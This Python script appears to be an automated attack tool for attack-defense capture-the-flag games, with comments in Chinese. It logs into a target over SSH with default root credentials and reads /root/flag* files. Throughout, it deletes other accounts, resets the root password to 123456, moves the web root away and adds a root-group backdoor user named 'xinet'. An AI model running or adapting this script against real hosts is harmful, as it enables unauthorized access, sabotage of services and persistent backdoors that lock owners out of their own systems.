# coding=utf-8

import pexpect
import os

import optparse

parser = optparse.OptionParser()
parser.add_option('-t', dest='target', type='string')
parser.add_option('-l', dest='username', type='string', default='root')
parser.add_option('-p', dest='password', type='string', default='123456')

(options, args) = parser.parse_args()

if options.target is None:
    parser.print_help()
    exit(0)

target = options.target
username = options.username
password = options.password

cmd = 'ssh %s@%s' % (username, target)
child = pexpect.spawn(cmd)

path = os.path.join(os.getcwd(), 'ssh_%s' % target)

with open(path, 'wb') as f:
    child.logfile = f

    res = child.expect([
        'Are you sure you want to continue connecting (yes/no)?', 'password:'
        , 'No route to host', pexpect.TIMEOUT], timeout=5)

    if res == 0:
        child.sendline('yes')
        child.expect('password:')
    elif res != 1:
        print 'Can not connect'
        exit(0)

    child.sendline(password)
    res = child.expect(['[#$]', 'Permission denied', pexpect.TIMEOUT, pexpect.EOF], timeout=5)
    if res == 1:
        print 'Permission denied'
        exit(0)
    elif res == 2:
        print 'Connect Time out'
        exit(0)

    # 获取Flag值
    child.sendline('chmod 777 /root/flag* 2>/dev/null;cat /root/flag*')
    child.expect(r'\[.*\][$#]')
    flag = child.before.split('\n')[1].replace('\n', '')
    print '[Flag] %s - %s' % (target, flag)

    # 不推荐,提交后需要等待10秒才能再次提交,还不如手动提交
    # import auto_flag
    # auto_flag.commit_flag(target,flag)

    # 帮他删除后门账号
    child.sendline('/usr/sbin/userdel -f admin')
    child.sendline('/usr/sbin/userdel -f hacker')
    child.sendline('/usr/sbin/userdel -f test')

    # 帮他改个更安全的密码,当然也可能会导致他再也无法给自己加固了
    child.sendline('echo root:123456 | /usr/sbin/chpasswd')

    # 帮助他删除危险的网站内容
    child.sendline('mv /var/www/html /tmp/backup/')

    # 这个没什么必要
    # child.sendline('echo "XD You has been hacked" | wall')

    # 为后面的刷分做准备
    child.sendline('/usr/sbin/useradd xinet')
    child.sendline('/usr/sbin/usermod -g root xinet')
    child.sendline('passwd xinet')
    child.sendline('123456')
    child.sendline('123456')

    child.sendline('exit')
    child.expect(pexpect.EOF)
